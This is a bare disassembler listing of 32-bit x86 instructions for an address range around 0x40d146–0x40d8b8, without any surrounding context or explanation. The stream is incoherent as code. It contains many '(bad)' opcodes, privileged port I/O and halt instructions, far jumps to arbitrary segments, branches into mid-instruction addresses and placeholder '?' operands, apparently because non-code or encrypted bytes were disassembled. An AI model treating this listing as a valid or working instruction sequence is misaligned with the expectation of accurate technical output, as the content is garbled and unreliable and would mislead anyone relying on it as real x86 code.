  40d146:	or     ecx,DWORD PTR [edi+0x6c]
  40d149:	retf   
  40d14a:	aas    
  40d14b:	cwde   
  40d14c:	jmp    0x40d101
  40d14e:	inc    DWORD PTR [esi]
  40d150:	xchg   DWORD PTR [ebx],ecx
  40d152:	jae    0x40d113
  40d154:	cld    
  40d155:	das    
  40d156:	gs xchg edi,eax
  40d158:	fisubr WORD PTR [edx+eiz*8]
  40d15b:	xor    eax,0x23c5a7d8
  40d160:	pop    ecx
  40d161:	inc    ebp
  40d162:	dec    ebx
  40d163:	adc    dl,BYTE PTR [esi-0x226cc500]
  40d169:	mov    ah,ah
  40d16b:	(bad)  
  40d16c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40d16d:	xor    BYTE PTR ds:0x75532450,0xc7
  40d174:	ja     0x40d14c
  40d176:	mov    esi,0x4d733e17
  40d17b:	outs   dx,BYTE PTR ds:[esi]
  40d17c:	pop    ds
  40d17d:	fwait
  40d17e:	arpl   WORD PTR [edx],sp
  40d180:	fwait
  40d181:	ss popf 
  40d183:	fs out 0xb9,al
  40d186:	bnd repz jg 0x40d117
  40d18a:	data16 aas 
  40d18c:	ret    0xef80
  40d18f:	cmp    edi,DWORD PTR [ebx]
  40d191:	or     eax,0xbcb60902
  40d196:	xor    dl,BYTE PTR [eax+0x25b352b1]
  40d19c:	fwait
  40d19d:	(bad)  
  40d19e:	out    0x73,al
  40d1a0:	fsubrp st(4),st
  40d1a2:	fadd   QWORD PTR ss:[ebx]
  40d1a5:	popa   
  40d1a6:	cmp    BYTE PTR [ebx],ch
  40d1a8:	mov    esp,0xc8a02569
  40d1ad:	in     eax,dx
  40d1ae:	stc    
  40d1af:	and    ah,dl
  40d1b1:	add    dh,BYTE PTR [ebp-0x6ef60ab]
  40d1b7:	jbe    0x40d1af
  40d1b9:	jp     0x40d14f
  40d1bb:	push   0xfffffff0
  40d1bd:	pop    edx
  40d1be:	daa    
  40d1bf:	rol    BYTE PTR [ebx+edi*1-0x5],0x2a
  40d1c4:	fdiv   DWORD PTR [ebx+ebx*1]
  40d1c7:	jle    0x40d15c
  40d1c9:	add    eax,0x8daf4b5
  40d1ce:	dec    ebp
  40d1cf:	pushf  
  40d1d0:	inc    ebp
  40d1d1:	cmc    
  40d1d2:	outs   dx,DWORD PTR ds:[esi]
  40d1d3:	pop    eax
  40d1d4:	out    dx,eax
  40d1d5:	enter  0xcda3,0xc1
  40d1d9:	or     DWORD PTR [ebp-0x6ed1c757],0x42049e7e
  40d1e3:	mov    ds:0x48cf18c7,eax
  40d1e8:	xor    al,dl
  40d1ea:	int    0xba
  40d1ec:	jbe    0x40d21a
  40d1ee:	and    bh,cl
  40d1f0:	hlt    
  40d1f1:	std    
  40d1f2:	mov    ecx,0xcdcf23ad
  40d1f7:	repnz inc edx
  40d1f9:	xlat   BYTE PTR ds:[ebx]
  40d1fa:	dec    ebp
  40d1fb:	sar    BYTE PTR [esi],cl
  40d1fd:	pushfw 
  40d1ff:	aad    0x6e
  40d201:	sar    BYTE PTR [edx+eiz*2+0x15],0xee
  40d206:	je     0x40d219
  40d208:	adc    BYTE PTR [ebx],ah
  40d20a:	in     eax,0x7f
  40d20c:	sti    
  40d20d:	aaa    
  40d20e:	sub    BYTE PTR [eax+0x7b],0x32
  40d212:	jnp    0x40d23a
  40d214:	push   ecx
  40d215:	ret    
  40d216:	and    eax,0x10935a99
  40d21b:	int    0x33
  40d21d:	add    esi,DWORD PTR [edx+0x2b]
  40d220:	fwait
  40d221:	cld    
  40d222:	callw  0x7748
  40d226:	rcr    al,1
  40d228:	imul   edi,DWORD PTR [ebx+0x5b],0x6229b24a
  40d22f:	(bad)  
  40d230:	test   al,0xac
  40d232:	mov    cs,WORD PTR es:[ecx]
  40d235:	inc    eax
  40d236:	adc    cl,BYTE PTR [eax-0x4c]
  40d239:	cmp    DWORD PTR [eax+0x2ff5695a],0x659fca8
  40d243:	in     al,dx
  40d244:	lock xchg DWORD PTR [esi],edi
  40d247:	pop    ebp
  40d248:	pusha  
  40d249:	pop    es
  40d24a:	test   eax,0xe988e3c7
  40d24f:	(bad)  
  40d250:	xlat   BYTE PTR ds:[ebx]
  40d251:	in     al,0xb0
  40d253:	idiv   BYTE PTR [edx-0x58]
  40d256:	sti    
  40d257:	(bad)  
  40d258:	jne    0x40d261
  40d25a:	mov    esp,edi
  40d25c:	add    bh,BYTE PTR [edi-0xf]
  40d25f:	mov    dh,0x77
  40d261:	and    DWORD PTR [ecx-0x1cc0e2dc],ebx
  40d267:	push   0xd1485ba0
  40d26c:	jb     0x40d230
  40d26e:	add    eax,0x6e20b093
  40d273:	or     al,0x1e
  40d275:	out    dx,eax
  40d276:	jbe    0x40d2ed
  40d278:	scas   al,BYTE PTR es:[edi]
  40d279:	add    al,0x7c
  40d27b:	sbb    bh,BYTE PTR [ebp+0x8]
  40d27e:	adc    al,0xe4
  40d280:	aad    0x8c
  40d282:	sbb    BYTE PTR [eax+0xb],0x6c
  40d286:	cld    
  40d287:	jecxz  0x40d236
  40d289:	sbb    ecx,DWORD PTR [esi]
  40d28b:	popf   
  40d28c:	sub    DWORD PTR [esi-0x2c],ebp
  40d28f:	jecxz  0x40d225
  40d291:	cld    
  40d292:	mov    eax,ds:0xfc6769de
  40d297:	xor    ch,BYTE PTR [edx+esi*4]
  40d29a:	dec    esi
  40d29b:	or     ebx,DWORD PTR [esi+0x4e]
  40d29e:	ja     0x40d2b2
  40d2a0:	pop    ecx
  40d2a1:	xor    BYTE PTR [esi],0x22
  40d2a4:	push   cs
  40d2a5:	and    eax,0xe0ef6d5b
  40d2aa:	popf   
  40d2ab:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40d2ac:	or     eax,0x5b03416b
  40d2b1:	fidivr WORD PTR [ebx+ebp*2+0x4a]
  40d2b5:	test   DWORD PTR [ecx+0x7d],ecx
  40d2b8:	lahf   
  40d2b9:	hlt    
  40d2ba:	popa   
  40d2bb:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40d2bc:	(bad)
  40d2c0:	lock les edx,FWORD PTR [esi+0x30]
  40d2c4:	loop   0x40d317
  40d2c6:	push   ds
  40d2c7:	pusha  
  40d2c8:	sbb    DWORD PTR [ebp-0x2f2b1d51],eax
  40d2ce:	mov    eax,0xeb731144
  40d2d3:	adc    eax,0xd0f25a49
  40d2d8:	sbb    ebp,DWORD PTR [esi]
  40d2da:	inc    esp
  40d2db:	add    eax,DWORD PTR [edi]
  40d2dd:	cmp    DWORD PTR [edi-0x23],edi
  40d2e0:	mov    eax,0xb0ca29a
  40d2e5:	enterw 0x42a7,0x51
  40d2ea:	and    BYTE PTR [esi+ecx*1],dh
  40d2ed:	sahf   
  40d2ee:	nop
  40d2ef:	out    dx,eax
  40d2f0:	inc    ecx
  40d2f1:	out    dx,al
  40d2f2:	jne    0x40d345
  40d2f4:	mov    ebx,0xf95610a5
  40d2f9:	add    ecx,edx
  40d2fb:	jp     0x40d2c9
  40d2fd:	add    BYTE PTR [ebp-0x25],cl
  40d300:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40d301:	cmc    
  40d302:	mov    esp,0x9ac613f3
  40d307:	shl    DWORD PTR [ebx+0x1e1680ba],1
  40d30d:	bound  eax,QWORD PTR [ecx]
  40d30f:	push   ebx
  40d310:	push   edi
  40d311:	jno    0x40d2b1
  40d313:	mov    ebx,0xc1236ffd
  40d318:	not    DWORD PTR [edx]
  40d31a:	xchg   esp,eax
  40d31b:	cmp    ah,BYTE PTR [ebx+ebp*1]
  40d31e:	cmp    esi,DWORD PTR [ebx+ecx*4-0x5]
  40d322:	imul   ebx,DWORD PTR ds:0x4b9940eb,0xffffffdb
  40d329:	daa    
  40d32a:	mov    esi,DWORD PTR [ebp+0x4f82f26b]
  40d330:	cmp    BYTE PTR [esi-0x6],al
  40d333:	xor    eax,0xfdc5b33e
  40d338:	mov    bl,BYTE PTR [ebp+0x3e]
  40d33b:	mov    esp,0x2f027bdc
  40d340:	xor    al,0xb9
  40d342:	xchg   ecx,eax
  40d343:	(bad)  
  40d344:	dec    edi
  40d345:	rcl    DWORD PTR [ebx+0x522c8561],cl
  40d34b:	imul   ebp,ecx,0x2a
  40d34e:	fwait
  40d34f:	xchg   ebx,eax
  40d350:	mov    edi,0xa4ce1ec7
  40d355:	stos   DWORD PTR es:[edi],eax
  40d356:	xchg   ebp,eax
  40d357:	out    dx,al
  40d358:	inc    edx
  40d359:	inc    edx
  40d35a:	fldenv [esi-0x2]
  40d35d:	dec    esi
  40d35e:	sbb    BYTE PTR [ecx],ch
  40d360:	mov    ah,0x78
  40d362:	popa   
  40d363:	aas    
  40d364:	lahf   
  40d365:	cmp    ebx,edx
  40d367:	pop    ebp
  40d368:	mov    gs,WORD PTR [ebx+0xe]
  40d36b:	retf   
  40d36c:	dec    ecx
  40d36d:	clc    
  40d36e:	mov    eax,0xa15425ca
  40d373:	mov    al,0xe9
  40d375:	pop    esi
  40d376:	and    al,bl
  40d378:	and    edi,DWORD PTR [eax]
  40d37a:	in     al,0xa
  40d37c:	hlt    
  40d37d:	mov    ebp,0x9e52240c
  40d382:	push   0x7a
  40d384:	ins    DWORD PTR es:[edi],dx
  40d385:	xchg   ecx,eax
  40d386:	cmc    
  40d387:	push   ss
  40d388:	(bad)  
  40d38a:	mov    ch,0xd9
  40d38c:	in     eax,dx
  40d38d:	retf   
  40d38e:	fdivr  DWORD PTR [esi-0x5f3e35e9]
  40d394:	add    BYTE PTR [eax+0x79],al
  40d397:	push   esi
  40d398:	addr16 mov eax,ds:0xec59
  40d39c:	clc    
  40d39d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40d39e:	or     eax,0x7a34ad38
  40d3a3:	adc    esi,DWORD PTR [edi+0x65]
  40d3a6:	sbb    ch,dh
  40d3a8:	xchg   dh,ch
  40d3aa:	nop
  40d3ab:	mov    esp,0xbe5fd6f2
  40d3b0:	leave  
  40d3b1:	icebp  
  40d3b2:	jno    0x40d345
  40d3b4:	(bad)  
  40d3b6:	fwait
  40d3b7:	inc    ebp
  40d3b8:	and    eax,0x12a77491
  40d3bd:	adc    DWORD PTR [eax+esi*4+0x6ef708bc],esi
  40d3c4:	push   eax
  40d3c5:	data16 xlat BYTE PTR ds:[ebx]
  40d3c7:	mov    eax,ds:0xb2a81378
  40d3cc:	pusha  
  40d3cd:	sbb    DWORD PTR [eax+ebx*8],eax
  40d3d0:	into   
  40d3d1:	xlat   BYTE PTR ds:[ebx]
  40d3d2:	cld    
  40d3d3:	jp     0x40d3c5
  40d3d5:	dec    ecx
  40d3d6:	mov    eax,ds:0x67b4a386
  40d3db:	dec    ebx
  40d3dc:	xchg   edx,eax
  40d3dd:	out    0xd5,eax
  40d3df:	and    eax,0xa26bb35
  40d3e4:	inc    esp
  40d3e6:	cld    
  40d3e7:	push   esi
  40d3e8:	(bad)  
  40d3e9:	punpcklwd mm0,DWORD PTR [esi-0xb]
  40d3ed:	xlat   BYTE PTR ds:[ebx]
  40d3ee:	dec    eax
  40d3ef:	das    
  40d3f0:	jp     0x40d3a7
  40d3f2:	std    
  40d3f3:	dec    ecx
  40d3f4:	fcmovne st,st(7)
  40d3f6:	pop    eax
  40d3f7:	adc    al,0x1c
  40d3f9:	mov    al,ds:0xcb309d84
  40d3fe:	sbb    al,0xa1
  40d400:	gs scas eax,DWORD PTR es:[edi]
  40d402:	enter  0xb07a,0x57
  40d406:	xchg   BYTE PTR [esi-0x6e],bh
  40d409:	pop    esi
  40d40a:	adc    al,0x75
  40d40c:	mov    esp,0xbe7662fa
  40d411:	not    BYTE PTR [eax-0x73d133b9]
  40d417:	bound  edx,QWORD PTR [esi+edx*2-0x24]
  40d41b:	retf   0xc053
  40d41e:	popa   
  40d41f:	addr16 inc esp
  40d421:	test   eax,0x2e45bb39
  40d426:	and    al,BYTE PTR [esi-0x74]
  40d429:	dec    ebp
  40d42a:	sti    
  40d42b:	test   BYTE PTR [edi+0x3022ae78],bh
  40d431:	add    eax,0x93b8f2e7
  40d436:	imul   ecx,DWORD PTR [ebx+eax*8+0x57a6898a],0xffffffe5
  40d43e:	push   edi
  40d43f:	adc    edx,DWORD PTR [edx]
  40d441:	popa   
  40d442:	mov    edi,?
  40d444:	adc    DWORD PTR [edi+0x64],edx
  40d447:	inc    BYTE PTR [ecx+0x12]
  40d44a:	iret   
  40d44b:	sub    bl,al
  40d44d:	pop    esi
  40d44e:	stos   DWORD PTR es:[edi],eax
  40d44f:	lahf   
  40d450:	and    eax,DWORD PTR [ecx+ebx*1+0x7e6dd65b]
  40d457:	imul   eax,DWORD PTR [ecx+ebp*4],0x6184cdca
  40d45e:	xchg   ecx,eax
  40d45f:	stc    
  40d460:	cmp    bl,BYTE PTR [ebx]
  40d462:	mov    ds:0xbc216a52,eax
  40d467:	lods   eax,DWORD PTR ds:[si]
  40d469:	jmp    0xa9130bd6
  40d46e:	ds aad 0x33
  40d471:	iret   
  40d472:	push   edx
  40d473:	push   di
  40d475:	inc    edx
  40d476:	pop    ebp
  40d477:	pop    eax
  40d478:	or     bl,al
  40d47a:	and    al,0x16
  40d47c:	adc    BYTE PTR [edi-0x2a],cl
  40d47f:	xchg   ebp,eax
  40d480:	inc    ebx
  40d481:	(bad)  
  40d482:	aad    0xa8
  40d484:	pop    ebx
  40d485:	mov    al,0x62
  40d487:	xchg   DWORD PTR [edx+ebp*4+0x4b21414e],esp
  40d48e:	xchg   BYTE PTR [ecx-0x4b891b3c],bh
  40d494:	sbb    DWORD PTR [ecx+0x16],0x89ac13de
  40d49b:	sti    
  40d49c:	sub    dx,WORD PTR [edx+0x11]
  40d4a0:	fwait
  40d4a1:	and    BYTE PTR [ebp+0x17],ch
  40d4a4:	jmp    0x1d0058ae
  40d4a9:	test   BYTE PTR [ecx-0x46],ch
  40d4ac:	push   esp
  40d4ad:	sbb    edx,DWORD PTR [edx+0x2d0700c1]
  40d4b3:	retf   
  40d4b4:	sbb    BYTE PTR [esi],al
  40d4b6:	jbe    0x40d449
  40d4b8:	sub    eax,ecx
  40d4ba:	enter  0xc9c5,0x63
  40d4be:	sti    
  40d4bf:	outs   dx,BYTE PTR ds:[esi]
  40d4c0:	imul   ebx,DWORD PTR [ebp+edi*8+0x1e61e491],0x67
  40d4c8:	outs   dx,BYTE PTR ds:[esi]
  40d4c9:	arpl   WORD PTR [esi+ebp*2-0x12271987],ax
  40d4d0:	xchg   ebp,eax
  40d4d1:	mov    al,cl
  40d4d3:	stos   BYTE PTR es:[edi],al
  40d4d4:	add    al,0x32
  40d4d6:	or     al,0xcd
  40d4d8:	fld    QWORD PTR [edx+0xd]
  40d4db:	mov    ds:0x8186bc3c,eax
  40d4e0:	or     eax,0xb0e2ca71
  40d4e5:	cmp    DWORD PTR [edx+0x4d3e520f],esp
  40d4eb:	push   cs
  40d4ec:	sbb    BYTE PTR [esp+ebx*8],0xab
  40d4f0:	repz push 0xffffffbe
  40d4f3:	mov    ss,esp
  40d4f5:	adc    eax,0x73313d6e
  40d4fa:	cmp    esp,DWORD PTR [ebx+0x1c]
  40d4fd:	push   esi
  40d4fe:	in     al,0xff
  40d500:	int    0x3d
  40d502:	mov    ds:0x5f3abeed,eax
  40d507:	sahf   
  40d508:	push   ebp
  40d509:	inc    esp
  40d50a:	shr    BYTE PTR [eax+ebp*2],cl
  40d50d:	mov    cl,0x7e
  40d50f:	or     bh,al
  40d511:	ins    DWORD PTR es:[edi],dx
  40d512:	mov    WORD PTR [eax],ds
  40d514:	mov    eax,0xe4612a86
  40d519:	sub    al,bh
  40d51b:	aaa    
  40d51c:	cmc    
  40d51d:	and    eax,0xea36947c
  40d522:	xor    DWORD PTR ds:0x8a04c849,ecx
  40d528:	jnp    0x40d55c
  40d52a:	in     al,dx
  40d52b:	ja     0x40d4d8
  40d52d:	xchg   ebp,eax
  40d52e:	stos   BYTE PTR es:[edi],al
  40d52f:	aam    0x2
  40d531:	lods   al,BYTE PTR ds:[esi]
  40d532:	call   0xea5687fd
  40d537:	test   eax,0x236d8f94
  40d53c:	std    
  40d53d:	adc    bh,bl
  40d53f:	mov    BYTE PTR [ebp-0x4d],ch
  40d542:	adc    esp,DWORD PTR [ecx]
  40d544:	push   esi
  40d545:	adc    ebp,ebp
  40d547:	test   DWORD PTR [ebx-0x57689b1e],eax
  40d54d:	jmp    0x4b18:0x24f6a33f
  40d554:	xor    dx,WORD PTR [esi+0x4a3a3d31]
  40d55b:	mov    esi,0xa6ac43a6
  40d560:	and    eax,0x486a0671
  40d565:	mov    esi,0xc72975e3
  40d56a:	sbb    ebx,edx
  40d56c:	pushf  
  40d56d:	loop   0x40d522
  40d56f:	xor    al,0xc1
  40d571:	ror    BYTE PTR [ecx+0x4e],0x1f
  40d575:	sub    eax,0xe77bc6b4
  40d57a:	adc    eax,0x6a35be18
  40d57f:	inc    ebx
  40d580:	hlt    
  40d581:	shr    DWORD PTR [eax-0x75],0x7d
  40d585:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40d586:	pop    ecx
  40d587:	hlt    
  40d588:	cmp    eax,0xe3a37bc7
  40d58d:	jmp    0x12c5:0x8129c37b
  40d594:	jns    0x40d5d0
  40d596:	mov    ?,ecx
  40d598:	popf   
  40d599:	or     esi,DWORD PTR [esi+0x19]
  40d59c:	mov    ch,0x40
  40d59e:	inc    ecx
  40d59f:	enter  0x36fa,0x95
  40d5a3:	jecxz  0x40d5e7
  40d5a5:	and    eax,0x49f364b7
  40d5aa:	cmp    ebp,0xffffff88
  40d5ad:	data16 jno 0x40d5e6
  40d5b0:	push   0x31
  40d5b2:	pop    edx
  40d5b3:	pop    esi
  40d5b4:	push   esi
  40d5b5:	mov    edi,0x514be68b
  40d5ba:	(bad)  
  40d5bc:	dec    ebp
  40d5bd:	inc    ebp
  40d5be:	push   edi
  40d5bf:	es pop edx
  40d5c1:	fs pop ss
  40d5c3:	rcl    BYTE PTR [ebx-0x20],1
  40d5c6:	call   0xf8f7fbae
  40d5cb:	push   esi
  40d5cc:	out    0x9e,al
  40d5ce:	mov    bl,0x17
  40d5d0:	push   ebp
  40d5d1:	(bad)  
  40d5d3:	sbb    al,0xf8
  40d5d5:	mov    bl,0x65
  40d5d7:	ret    0x9f8b
  40d5da:	das    
  40d5db:	dec    eax
  40d5dc:	(bad)  
  40d5dd:	sub    eax,0x88b47c8e
  40d5e2:	pop    edx
  40d5e3:	xor    ebp,DWORD PTR [esi-0x259eca1b]
  40d5e9:	mov    BYTE PTR [ebx-0x574ecdf4],bh
  40d5ef:	dec    ebp
  40d5f0:	dec    esi
  40d5f1:	push   eax
  40d5f2:	sbb    BYTE PTR [edi],0xb1
  40d5f5:	test   DWORD PTR [ebx+0x18],esi
  40d5f8:	jmp    0xe7d1:0xe949a419
  40d5ff:	cmc    
  40d600:	scas   al,BYTE PTR es:[edi]
  40d601:	loope  0x40d5fe
  40d603:	cs (bad) 
  40d605:	(bad)  
  40d608:	pop    ebp
  40d609:	out    dx,al
  40d60a:	ss mov ah,0x22
  40d60d:	loopne 0x40d630
  40d60f:	call   DWORD PTR ds:0xf7edb39a
  40d615:	mul    BYTE PTR [esi-0x10]
  40d618:	stos   DWORD PTR es:[edi],eax
  40d619:	inc    BYTE PTR [esi]
  40d61b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40d61c:	mov    ebp,0xdd00a8ce
  40d621:	mov    ebx,0x91b79f25
  40d626:	cmp    DWORD PTR [edx+0x100d1489],eax
  40d62c:	inc    esi
  40d62d:	add    DWORD PTR ds:0xe206ef9b,0x156aecdb
  40d637:	or     al,0xb8
  40d639:	and    BYTE PTR [esi],bh
  40d63b:	arpl   WORD PTR [esi+0x18],bp
  40d63e:	cmp    cl,BYTE PTR [eax+0x3b]
  40d641:	push   cs
  40d642:	adc    al,0x80
  40d644:	sbb    eax,0x4120904c
  40d649:	mov    cs,WORD PTR [edi+esi*8]
  40d64c:	inc    eax
  40d64d:	adc    al,0xda
  40d64f:	pop    ds
  40d650:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40d651:	scas   al,BYTE PTR es:[edi]
  40d652:	add    ch,BYTE PTR [ebx-0x4f16d9ee]
  40d658:	xchg   BYTE PTR es:[edi-0x787edda],cl
  40d65f:	xlat   BYTE PTR ds:[ebx]
  40d660:	pop    ss
  40d661:	(bad)  [edi+0x13]
  40d664:	mov    ds:0xacfa1c63,eax
  40d669:	jecxz  0x40d5fd
  40d66b:	(bad)  
  40d66c:	cmp    ch,BYTE PTR [edx]
  40d66e:	fldcw  WORD PTR [edi-0x77]
  40d671:	stos   DWORD PTR es:[edi],eax
  40d672:	fwait
  40d673:	dec    edx
  40d674:	add    DWORD PTR [esi-0x12],0xffffffd8
  40d678:	retf   0x94c5
  40d67b:	fld    st(1)
  40d67d:	cmp    eax,0x8755187d
  40d682:	fldcw  WORD PTR [ebx+0x52]
  40d685:	jb     0x40d6c3
  40d687:	adc    al,0x35
  40d689:	push   0xffffffd7
  40d68b:	iret   
  40d68c:	push   edx
  40d68d:	push   ds
  40d68e:	xchg   esi,eax
  40d68f:	dec    esi
  40d690:	aad    0x45
  40d692:	imul   ebx,DWORD PTR [edx+0x56],0x76
  40d696:	ins    DWORD PTR es:[edi],dx
  40d697:	aam    0x7d
  40d699:	nop
  40d69a:	rcr    DWORD PTR [esp+edi*4],cl
  40d69d:	jnp    0x40d68e
  40d69f:	xor    DWORD PTR [edx+0x6e],eax
  40d6a2:	pop    es
  40d6a3:	cmp    BYTE PTR [eax+0x23],cl
  40d6a6:	mov    DWORD PTR [eax-0x21],edx
  40d6a9:	mov    bl,0x3a
  40d6ab:	popf   
  40d6ac:	sub    al,0xde
  40d6ae:	add    al,0x17
  40d6b0:	pop    eax
  40d6b1:	dec    BYTE PTR [ecx+0x7f]
  40d6b4:	and    BYTE PTR ds:[esi-0x41],ch
  40d6b8:	(bad)  
  40d6b9:	ss stos BYTE PTR es:[edi],al
  40d6bb:	imul   edi,DWORD PTR [ebx+eiz*8+0x79b3037c],0xaea1d4d3
  40d6c6:	cdq    
  40d6c7:	sar    DWORD PTR [esp-0x188da99c],0xb4
  40d6cf:	call   0xb614b23a
  40d6d4:	stos   DWORD PTR es:[edi],eax
  40d6d5:	std    
  40d6d6:	imul   esi,DWORD PTR [edi-0x698a1f8b],0x64
  40d6dd:	out    0xff,eax
  40d6df:	fwait
  40d6e0:	pop    ds
  40d6e1:	mov    ebx,0xa511e3ee
  40d6e6:	or     al,0xd8
  40d6e8:	inc    esp
  40d6e9:	ins    DWORD PTR es:[edi],dx
  40d6ea:	mov    ebp,0xb672c9b0
  40d6ef:	dec    ebx
  40d6f0:	sub    dl,BYTE PTR [esp+ebp*4+0x1]
  40d6f4:	in     eax,0xa0
  40d6f6:	mov    ds:0x44770c73,eax
  40d6fb:	xchg   esp,eax
  40d6fc:	or     eax,0x2eb4784f
  40d701:	ret    
  40d702:	sbb    eax,0x393e6d98
  40d707:	mov    dl,0x4a
  40d709:	jmp    0x5f97daf2
  40d70e:	xor    eax,0xefea0b6f
  40d713:	leave  
  40d714:	or     cl,dh
  40d716:	retf   
  40d717:	ins    BYTE PTR es:[edi],dx
  40d718:	xchg   ebx,eax
  40d719:	sbb    eax,0xdf49a273
  40d71e:	xor    al,0x1b
  40d720:	or     esi,DWORD PTR [ebx]
  40d722:	into   
  40d723:	mov    edx,0xedfe71e1
  40d728:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40d729:	aaa    
  40d72a:	ins    DWORD PTR es:[edi],dx
  40d72b:	sti    
  40d72c:	shl    ebx,0x40
  40d72f:	jp     0x40d768
  40d731:	repz nop ecx
  40d735:	ja     0x40d710
  40d737:	mov    edx,0xdc7513bf
  40d73c:	cmova  ebx,DWORD PTR [edi]
  40d73f:	lea    ecx,[esi-0x1edcc61d]
  40d745:	lock sub eax,0x153a21bf
  40d74b:	fst    QWORD PTR [edx+0x36ba53c9]
  40d751:	shr    BYTE PTR [ebp+0x6d6a2055],cl
  40d757:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40d758:	call   0xc5c0948a
  40d75d:	icebp  
  40d75e:	stos   DWORD PTR es:[edi],eax
  40d75f:	popf   
  40d760:	mov    ds:0x6a8a55d9,al
  40d765:	in     eax,dx
  40d766:	push   ds
  40d767:	mov    DWORD PTR [eax],edx
  40d769:	sbb    ebx,0x49fd2683
  40d76f:	mov    esp,0x8147047
  40d774:	adc    dh,BYTE PTR [eax+0x19cbf1de]
  40d77a:	pop    es
  40d77b:	fsubr  QWORD PTR [ebx+eiz*4]
  40d77e:	lock adc eax,0xe3b4f159
  40d784:	jl     0x40d74a
  40d786:	iret   
  40d787:	rol    BYTE PTR [edx+ebx*2],1
  40d78a:	cmc    
  40d78b:	ret    
  40d78c:	push   ds
  40d78d:	push   0xfffffff7
  40d78f:	out    0x1d,eax
  40d791:	lea    edx,[eax]
  40d793:	into   
  40d794:	adc    ecx,ebp
  40d796:	push   cs
  40d797:	xor    BYTE PTR [ecx+0x3d],al
  40d79a:	or     ah,cl
  40d79c:	in     eax,dx
  40d79d:	div    DWORD PTR [ebp+0x3ad1a0a8]
  40d7a3:	sub    bl,BYTE PTR [ecx+0x7e42877d]
  40d7a9:	or     ch,BYTE PTR [ecx-0x5fe1ae72]
  40d7af:	sbb    BYTE PTR [ebx],bh
  40d7b1:	data16 jle 0x40d784
  40d7b4:	mov    bh,BYTE PTR [esi+0x52]
  40d7b7:	sbb    bh,BYTE PTR [ebp+0x236b9480]
  40d7bd:	jmp    0x77c2:0x4e10b695
  40d7c4:	push   ebx
  40d7c5:	sbb    bl,BYTE PTR [edx+eiz*4-0x328c39ac]
  40d7cc:	loope  0x40d7bd
  40d7ce:	adc    ah,0xcd
  40d7d1:	stc    
  40d7d2:	pop    ebx
  40d7d3:	lods   eax,DWORD PTR ds:[esi]
  40d7d4:	cmp    eax,0x52038bad
  40d7d9:	pop    ebx
  40d7da:	jge    0x40d820
  40d7dc:	stc    
  40d7dd:	push   0x70005563
  40d7e2:	je     0x40d7ad
  40d7e4:	(bad)  
  40d7e5:	fldlg2 
  40d7e7:	push   0xbcdc5c22
  40d7ec:	inc    eax
  40d7ed:	lods   al,BYTE PTR ds:[esi]
  40d7ee:	lea    edx,[ecx+eax*1+0x1eb99615]
  40d7f5:	hlt    
  40d7f6:	pop    ebx
  40d7f7:	add    DWORD PTR ds:0x82260f2a,esi
  40d7fd:	xor    DWORD PTR ds:[edx],ebp
  40d800:	mov    dl,0x8a
  40d802:	cmp    eax,0xb64a1c08
  40d807:	mov    bl,0x4
  40d809:	cmp    BYTE PTR [edi+0x14c3f13e],0x1e
  40d810:	adc    BYTE PTR [esi],0x9f
  40d813:	fwait
  40d814:	jbe    0x40d816
  40d816:	sbb    eax,0x6e5ab5b6
  40d81b:	leave  
  40d81c:	clc    
  40d81d:	jp     0x40d7fb
  40d81f:	dec    esi
  40d820:	fist   WORD PTR ds:0x1f824e9
  40d826:	and    bh,BYTE PTR [eax]
  40d828:	ja     0x40d87e
  40d82a:	sub    cl,BYTE PTR [esi]
  40d82c:	repz sub dh,BYTE PTR [eax]
  40d82f:	dec    edi
  40d830:	jp     0x40d827
  40d832:	cmc    
  40d833:	lahf   
  40d834:	mov    BYTE PTR [eax],dl
  40d836:	adc    al,BYTE PTR [edi-0x7b]
  40d839:	push   ss
  40d83a:	or     ch,BYTE PTR [eax-0x18]
  40d83d:	jno    0x40d7ea
  40d83f:	jb     0x40d875
  40d841:	inc    esp
  40d842:	jecxz  0x40d863
  40d844:	jl     0x40d893
  40d846:	scas   al,BYTE PTR es:[edi]
  40d847:	mov    esi,0xf4361ee4
  40d84c:	push   ecx
  40d84d:	sub    esp,DWORD PTR [ecx+edx*8+0x52]
  40d851:	stos   DWORD PTR es:[edi],eax
  40d852:	shr    BYTE PTR [ebx],cl
  40d854:	dec    ecx
  40d855:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40d856:	lods   al,BYTE PTR ds:[esi]
  40d857:	stos   BYTE PTR es:[edi],al
  40d858:	mov    bh,BYTE PTR [edx-0x7]
  40d85b:	cmp    BYTE PTR [eax+0x4f],ah
  40d85e:	aad    0x3c
  40d860:	pop    es
  40d861:	call   0xa3e3a09b
  40d866:	call   0xa6ee:0xbcc0f04e
  40d86d:	add    DWORD PTR [ebx-0x4e],eax
  40d870:	dec    eax
  40d871:	xchg   ebp,eax
  40d872:	enter  0xf5e1,0xd8
  40d876:	fadd   QWORD PTR [ecx+0xe]
  40d879:	pop    edx
  40d87a:	shl    BYTE PTR [edx-0x164cc4fd],1
  40d880:	pop    esi
  40d881:	fmul   DWORD PTR [esi+eiz*8-0x5a1594d2]
  40d888:	pop    edx
  40d889:	pushf  
  40d88a:	add    DWORD PTR [ebx],eax
  40d88c:	mov    al,0x31
  40d88e:	pop    edi
  40d88f:	cmp    al,0xfb
  40d891:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40d892:	jb     0x40d85c
  40d894:	out    0x72,eax
  40d896:	shr    BYTE PTR [eax+edi*1],cl
  40d899:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40d89a:	jecxz  0x40d8ea
  40d89c:	dec    edi
  40d89d:	je     0x40d865
  40d89f:	rol    BYTE PTR [ebx],cl
  40d8a1:	adc    ecx,0xf225fc7e
  40d8a7:	cmp    BYTE PTR [ebx-0xd1b79a7],al
  40d8ad:	stc    
  40d8ae:	(bad)  
  40d8af:	push   ebx
  40d8b0:	into   
  40d8b1:	aas    
  40d8b2:	dec    esp
  40d8b3:	fst    DWORD PTR [edx-0x6d]
  40d8b6:	xchg   cl,ch
  40d8b8:	and    al,0xda
